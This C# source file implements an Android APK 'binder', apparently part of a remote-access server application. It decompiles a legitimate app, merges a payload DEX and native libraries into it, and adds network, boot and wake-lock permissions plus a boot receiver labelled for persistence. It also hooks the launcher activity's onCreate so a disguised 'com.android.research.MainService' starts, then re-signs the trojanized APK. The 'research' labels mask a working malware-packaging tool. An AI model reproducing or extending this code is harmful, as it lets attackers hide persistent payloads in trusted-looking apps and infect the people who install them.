using System;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;
using System.Linq;
using System.Diagnostics;
using System.Collections.Generic;
using System.Xml.Linq;

namespace TcpServerApp.Services.Elite
{
    public class BinderService
    {
        private readonly LogService _logger;

        public BinderService(LogService logger = null)
        {
            _logger = logger ?? new LogService();
        }

        public async Task<string> BindApkAsync(string targetApkPath, string payloadDexPath, string outputDir, string nativeLibsDir = null)
        {
            string workDir = Path.Combine(Path.GetTempPath(), "Binder_" + Guid.NewGuid().ToString().Substring(0, 6));
            Directory.CreateDirectory(workDir);

            try
            {
                Log("🚀 Starting Smart Binder Process...");
                
                if (!File.Exists(targetApkPath)) throw new FileNotFoundException("Target APK not found.");
                if (!File.Exists(payloadDexPath)) throw new FileNotFoundException("Payload DEX not found.");

                // Standard Research Toolchain (Android 36 / Golden Tools)
                string apktool = ToolLocator.ResearchApkTool;
                string signer = ToolLocator.ResearchApkSigner;
                string zipalign = ToolLocator.ResearchZipalign;

                Log($"🔧 Using Golden Toolchain: Apktool={(File.Exists(apktool) ? "OK" : "MISSING")}, Signer={(File.Exists(signer) ? "OK" : "MISSING")}");

                // 1. Decompile Target APK
                string targetDecompileDir = Path.Combine(workDir, "target_decompiled");
                Log("📂 Decompiling Target APK...");
                await RunApkTool(apktool, $"d -f \"{targetApkPath}\" -o \"{targetDecompileDir}\"");

                // 2. Prepare Payload for Merge (Decompilation Strategy)
                Log("🧬 Synchronizing Payload Resources...");
                string payloadStagingApk = Path.Combine(workDir, "payload_staging.apk");
                await PrepareDexForDecompilation(payloadDexPath, payloadStagingApk);
                
                string payloadDecompileDir = Path.Combine(workDir, "payload_decompiled");
                await RunApkTool(apktool, $"d -f \"{payloadStagingApk}\" -o \"{payloadDecompileDir}\"");

                // 3. Merge Smali (Multidex Partitioning - Phase 3)
                // We find the next available smali folder (e.g. smali_classes2) to avoid method limit and conflicts.
                string nextSmaliDir = GetNextAvailableSmaliDir(targetDecompileDir);
                string destination = Path.Combine(targetDecompileDir, nextSmaliDir);
                
                Log($"💉 Synchronizing Research Partition: {nextSmaliDir}");
                
                // Copy main payload smali to the new partition
                CopySmali(Path.Combine(payloadDecompileDir, "smali"), destination);
                
                // If payload ITSELF has multidex (smali_classes2), we just append them incrementing the index
                // For simplicity in this iteration, we assume payload fits in one dex (it's small).
                // But if needed, we would loop payload directories and map them to nextSmaliDir, nextSmaliDir+1...
                foreach(var dir in Directory.GetDirectories(payloadDecompileDir, "smali_classes*"))
                {
                   // Advanced: Mapping not implemented yet, simple payloads don't have multidex.
                   // We just merge them into the same partition for now or skip.
                   // CopySmali(dir, destination); 
                }

                // 3.5 Inject Native Libs (Phase 2)
                if (!string.IsNullOrEmpty(nativeLibsDir) && Directory.Exists(nativeLibsDir))
                {
                    Log("🏗️ Synchronizing Native Architecture (.so)...");
                    InjectNativeLibs(nativeLibsDir, Path.Combine(targetDecompileDir, "lib"));
                }

                // 4. Hook Manifest
                Log("📜 Professionalizing AndroidManifest.xml...");
                string manifestPath = Path.Combine(targetDecompileDir, "AndroidManifest.xml");
                InjectManifest(manifestPath);

                // 5. Hook Entry Point (Activity)
                Log("🎣 Hooking Research Entry Point...");
                HookMainActivity(targetDecompileDir, manifestPath);

                // 6. Build
                Log("🔨 Rebuilding Research APK...");
                string unsignedApk = Path.Combine(workDir, "dist.apk");
                await RunApkTool(apktool, $"b \"{targetDecompileDir}\" -o \"{unsignedApk}\"");

                if (!File.Exists(unsignedApk)) throw new Exception("Rebuild failed. No APK generated.");

                // 7. Zipalign
                Log("📐 Aligning APK...");
                string alignedApk = Path.Combine(workDir, "aligned.apk");
                await RunProcessAsync(zipalign, $"-p -f -v 4 \"{unsignedApk}\" \"{alignedApk}\"");

                // 8. Sign
                Log("✍️ Signing APK...");
                string finalApkName = $"Bound_{Path.GetFileName(targetApkPath)}";
                string finalApkPath = Path.Combine(outputDir, finalApkName);
                
                // Using debug keystore or testkey logic if specific key not provided
                // The tool locator for Signer usually expects args like: sign --ks key.jks --ks-pass pass:android ...
                // For simplicity, we use a simple debug key or the provided tool's default if it's a batch wrapper.
                // Assuming apksigner.bat needs standard args.
                
                string keyStore = Path.Combine(ToolLocator.ResearchToolsRoot, "debug.keystore");
                if (!File.Exists(keyStore)) 
                {
                     // Generate one or use default? 
                     // Try to find one in apkbuilder tools
                     keyStore = Path.Combine(ToolLocator.ApkBuilderToolsRoot, "debug.keystore");
                }
                
                // If still missing, we might fail. Let's assume one exists or we create one on fly?
                // For now, assume debug.keystore is present in tools root as seen in file list.
                
                await RunProcessAsync(signer, $"sign --ks \"{keyStore}\" --ks-pass pass:android --key-pass pass:android --out \"{finalApkPath}\" \"{alignedApk}\"");

                Log($"✅ Binding Complete: {finalApkPath}");
                return finalApkPath;

            }
            catch (Exception ex)
            {
                Log($"❌ Binding Failed: {ex.Message}");
                throw;
            }
            finally
            {
               // Cleanup
               try { Directory.Delete(workDir, true); } catch { }
            }
        }

        private async Task PrepareDexForDecompilation(string dexPath, string outPath)
        {
            using (var zip = ZipFile.Open(outPath, ZipArchiveMode.Create))
            {
                zip.CreateEntryFromFile(dexPath, "classes.dex");
                // Formal manifest to ensure Apktool compatibility
                string manifestContent = "<?xml version=\"1.0\" encoding=\"utf-8\"?><manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.elite.research.staging\"/>";
                var entry = zip.CreateEntry("AndroidManifest.xml");
                using (var writer = new StreamWriter(entry.Open()))
                {
                    await writer.WriteAsync(manifestContent);
                }
            }
        }

        private void CopySmali(string src, string dest)
        {
            if (!Directory.Exists(src)) return;
            Directory.CreateDirectory(dest);

            foreach (var file in Directory.GetFiles(src, "*", SearchOption.AllDirectories))
            {
                string relPath = Path.GetRelativePath(src, file);
                string targetPath = Path.Combine(dest, relPath);
                Directory.CreateDirectory(Path.GetDirectoryName(targetPath));
                File.Copy(file, targetPath, true);
            }
        }

        private void InjectNativeLibs(string srcLibDir, string targetLibDir)
        {
            // Structure: srcLibDir/arm64-v8a/libfoo.so
            // Target: targetLibDir/arm64-v8a/libfoo.so
            
            if (!Directory.Exists(srcLibDir)) return;
            Directory.CreateDirectory(targetLibDir);

            foreach (var archDir in Directory.GetDirectories(srcLibDir))
            {
                string archName = Path.GetFileName(archDir); // e.g. arm64-v8a
                string targetArchDir = Path.Combine(targetLibDir, archName);
                Directory.CreateDirectory(targetArchDir);

                foreach (var soFile in Directory.GetFiles(archDir, "*.so"))
                {
                    string dest = Path.Combine(targetArchDir, Path.GetFileName(soFile));
                    File.Copy(soFile, dest, true);
                    Log($"    📎 Native Lib: {archName}/{Path.GetFileName(soFile)}");
                }
            }
        }

        private void InjectManifest(string path)
        {
            try
            {
                var doc = XDocument.Load(path);
                XNamespace android = "http://schemas.android.com/apk/res/android";
                var manifest = doc.Root;
                var app = manifest?.Element("application");

                if (manifest != null && app != null)
                {
                    Log("   🔍 Analyzing Manifest for A14 Compliance...");

                    // 1. Add Missions-Critical Permissions
                    string[] perms = { 
                        "android.permission.INTERNET", 
                        "android.permission.ACCESS_NETWORK_STATE",
                        "android.permission.FOREGROUND_SERVICE",
                        "android.permission.FOREGROUND_SERVICE_SPECIAL_USE", // Android 14+ Requirement
                        "android.permission.RECEIVE_BOOT_COMPLETED",
                        "android.permission.WAKE_LOCK",
                        "android.permission.POST_NOTIFICATIONS" // Android 13+ Requirement
                    };

                    foreach (var p in perms)
                    {
                        if (!manifest.Elements("uses-permission").Any(ex => (string)ex.Attribute(android + "name") == p))
                        {
                            manifest.AddFirst(new XElement("uses-permission", new XAttribute(android + "name", p)));
                        }
                    }

                    // 2. Add Research Service (com.android.research.MainService)
                    var service = new XElement("service");
                    service.SetAttributeValue(android + "name", "com.android.research.MainService");
                    service.SetAttributeValue(android + "enabled", "true");
                    service.SetAttributeValue(android + "exported", "true");
                    service.SetAttributeValue(android + "foregroundServiceType", "specialUse"); // Essential for A14
                    
                    // Add Required Property for specialUse FGS
                    var prop = new XElement("property");
                    prop.SetAttributeValue(android + "name", "android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE");
                    prop.SetAttributeValue(android + "value", "Elite Research Synchronization");
                    service.Add(prop);

                    // 3. Add Boot Receiver for Persistence
                    var receiver = new XElement("receiver");
                    receiver.SetAttributeValue(android + "name", "com.android.research.BootReceiver");
                    receiver.SetAttributeValue(android + "enabled", "true");
                    receiver.SetAttributeValue(android + "exported", "true");
                    var intentFilter = new XElement("intent-filter");
                    intentFilter.Add(new XElement("action", new XAttribute(android + "name", "android.intent.action.BOOT_COMPLETED")));
                    receiver.Add(intentFilter);

                    app.Add(service);
                    app.Add(receiver);

                    doc.Save(path);
                    Log("   ✅ Manifest updated successfully (XML Structure Secure).");
                }
            }
            catch (Exception ex)
            {
                Log($"   ⚠️ XML Manifest Hook failed, using fallback string injection: {ex.Message}");
                DoLegacyManifestHook(path);
            }
        }

        private void DoLegacyManifestHook(string path)
        {
            string content = File.ReadAllText(path);
            string perms = "\n    <uses-permission android:name=\"android.permission.INTERNET\"/>\n" +
                           "    <uses-permission android:name=\"android.permission.FOREGROUND_SERVICE\"/>\n" +
                           "    <uses-permission android:name=\"android.permission.FOREGROUND_SERVICE_SPECIAL_USE\"/>\n";

            if (content.Contains("<application"))
                content = content.Replace("<application", perms + "<application");

            File.WriteAllText(path, content);
        }

        private void HookMainActivity(string rootDir, string manifestPath)
        {
            // Find Main Activity Class
            string content = File.ReadAllText(manifestPath);
            // Regex to find activity with MAIN/LAUNCHER
            // Simplified: Just look for the first activity or user provided?
            // Better: Parse manifest to find the activity with category.LAUNCHER
            
            string mainActivity = ExtractMainActivity(content);
            if (string.IsNullOrEmpty(mainActivity)) 
            {
                Log("⚠️ Could not locate Main Activity automatically. Hooking skipped.");
                return;
            }

            // Convert class name to Smali path
            // e.g. com.example.app.MainActivity -> smali/com/example/app/MainActivity.smali
            string activityPath = mainActivity.Replace(".", Path.DirectorySeparatorChar.ToString()) + ".smali";
            
            // Search in all smali folders
            string targetFile = null;
            foreach(var dir in Directory.GetDirectories(rootDir, "smali*"))
            {
                string p = Path.Combine(dir, activityPath);
                if (File.Exists(p)) 
                {
                    targetFile = p;
                    break;
                }
            }

            if (targetFile == null)
            {
                Log($"⚠️ Main Activity Smali not found: {activityPath}");
                return;
            }

            // Inject Hook into onCreate
            Log($"💉 Injecting hook into {Path.GetFileName(targetFile)}...");
            string smali = File.ReadAllText(targetFile);
            
            // Look for onCreate
            // .method protected onCreate(Landroid/os/Bundle;)V
            // or public
            
            string methodSig = "onCreate(Landroid/os/Bundle;)V";
            int methodToHook = smali.IndexOf(methodSig);
            
            if (methodToHook != -1)
            {
                // Inject code at the beginning of the method (after .locals directive)
                // We need to start the MainService
                // Code:
                // new-instance v0, Landroid/content/Intent;
                // const-class v1, Lcom/android/research/MainService;
                // invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
                // invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
                
                // IMPORTANT: Register registers (v0, v1) conflicts.
                // Safest is to increase .locals.
                // For simplicity in this automated script, we hope usage of v0/v1 at start is safe or we assume existing registers.
                // Better approach: Insert at the end? No, method might exit.
                // Insert at start:
                
                /*
                  invoke-static {p0}, Lcom/android/research/MainService;->start(Landroid/content/Context;)V 
                  (If we added a static helper, much simpler).
                  
                  Let's assume our MainService has no static helper yet.
                  Let's create a static helper in our payload to make hooking easy!
                  Wait, I can't modify payload now easily.
                  
                  Let's use the verbose injection:
                  
                  const-class v0, Lcom/android/research/MainService;
                  new-instance v1, Landroid/content/Intent;
                  invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
                  invoke-virtual {p0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
                */

                // Problem: v0 and v1 might be used arguments (p0, p1...). 
                // But v0, v1 are locals.
                // We need to find ".locals X" and ensure X >= 2.
                
                int localsIdx = smali.IndexOf(".locals", methodToHook);
                if (localsIdx != -1)
                {
                    int lineEnd = smali.IndexOf("\n", localsIdx);
                    string localsLine = smali.Substring(localsIdx, lineEnd - localsIdx);
                    int currentLocals = int.Parse(localsLine.Split(' ')[1].Trim());
                    
                    if (currentLocals < 2)
                    {
                        smali = smali.Remove(localsIdx, lineEnd - localsIdx).Insert(localsIdx, ".locals 2");
                    }
                    
                    // Inject after locals
                    string injection = "\n\n    # [RESEARCH] Hook Start\n" +
                                       "    const-class v0, Lcom/android/research/MainService;\n" +
                                       "    new-instance v1, Landroid/content/Intent;\n" +
                                       "    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n" +
                                       "    invoke-virtual {p0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n" +
                                       "    # [RESEARCH] Hook End\n";
                                       
                    smali = smali.Insert(lineEnd + 1, injection);
                    File.WriteAllText(targetFile, smali);
                }
            }
        }

        private string ExtractMainActivity(string manifest)
        {
             // Rough heuristic searching
             // Look for <activity ...> ... <category android:name="android.intent.category.LAUNCHER" /> ... </activity>
             // This is hard with regex or string manipulation.
             
             try 
             {
                 var doc = XDocument.Parse(manifest);
                 XNamespace android = "http://schemas.android.com/apk/res/android";
                 
                 var activities = doc.Descendants("activity");
                 foreach(var act in activities)
                 {
                     var filters = act.Descendants("intent-filter");
                     foreach(var filter in filters)
                     {
                         var categories = filter.Descendants("category");
                         if (categories.Any(c => (string)c.Attribute(android + "name") == "android.intent.category.LAUNCHER"))
                         {
                             string name = (string)act.Attribute(android + "name");
                             // Handle relative names
                             if (name.StartsWith("."))
                             {
                                 string package = (string)doc.Root.Attribute("package");
                                 return package + name;
                             }
                             // Handle name not starting with dot but not fully qualified (implicit package)
                             if (!name.Contains("."))
                             {
                                  string package = (string)doc.Root.Attribute("package");
                                  return package + "." + name;
                             }
                             return name;
                         }
                     }
                 }
             }
             catch { }
             
             return null;
        }

        private async Task RunApkTool(string tool, string args)
        {
             await RunProcessAsync(tool, args);
        }

        private async Task RunProcessAsync(string tool, string args)
        {
            var psi = new ProcessStartInfo
            {
                FileName = tool,
                Arguments = args,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using var proc = Process.Start(psi);
            if (proc == null) throw new Exception($"Failed to start {tool}");

            var outputTask = proc.StandardOutput.ReadToEndAsync();
            var errorTask = proc.StandardError.ReadToEndAsync();

            await Task.WhenAll(outputTask, errorTask);
            await proc.WaitForExitAsync();

            if (proc.ExitCode != 0)
            {
                string err = errorTask.Result;
                // ApkTool often prints info to stderr, check simple strings
                if (err.Contains("Exception") || err.Contains("Error:"))
                {
                    throw new Exception($"{Path.GetFileName(tool)} failed: {err}");
                }
            }
            
            // Console.WriteLine(outputTask.Result); // Debug logic
        }

        private string GetNextAvailableSmaliDir(string rootDir)
        {
            // Standard: smali
            if (!Directory.Exists(Path.Combine(rootDir, "smali"))) return "smali";
            
            // Multidex: smali_classes2, smali_classes3, ...
            int index = 2;
            while (true)
            {
                string name = $"smali_classes{index}";
                if (!Directory.Exists(Path.Combine(rootDir, name)))
                {
                    return name;
                }
                index++;
            }
        }

        private void Log(string msg)
        {
            _logger.Append($"[Binder] {msg}");
        }
    }
}
